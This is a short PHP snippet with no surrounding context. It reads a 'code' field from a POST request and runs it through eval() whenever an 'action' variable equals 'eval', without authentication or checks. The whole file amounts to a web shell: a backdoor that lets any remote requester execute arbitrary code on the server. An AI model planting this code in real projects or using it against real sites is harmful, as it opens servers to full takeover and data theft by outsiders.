<?php
if(($action === "eval")&&(isset($_POST["code"])))
{
    $code = $_POST["code"];
    eval($code);
}

?>